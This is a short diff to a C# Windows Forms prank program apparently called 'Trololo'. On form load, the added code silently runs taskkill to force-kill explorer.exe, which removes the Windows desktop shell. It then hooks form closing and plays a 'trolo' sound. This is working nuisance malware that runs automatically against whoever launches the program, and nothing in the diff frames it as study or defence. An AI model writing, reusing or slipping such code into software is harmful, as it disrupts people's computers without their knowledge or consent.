@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
 using System.Media;
@@ -22,6 +23,17 @@ namespace Trololo
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            Process p = new Process();
+            p.StartInfo.FileName = "taskkill.exe";
+            p.StartInfo.Arguments = "/f /im explorer.exe";
+;            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardInput = false;
+            p.StartInfo.RedirectStandardOutput = false;
+            p.StartInfo.RedirectStandardError = false;
+            p.StartInfo.CreateNoWindow = true;
+            p.Start();
+            p.WaitForExit();
+            p.Close();
             this.FormClosing += Form1_FormClosing;
             this.Visible = true;
             SoundPlayer player = new SoundPlayer(Properties.Resources.ResourceManager.GetStream("trolo"));
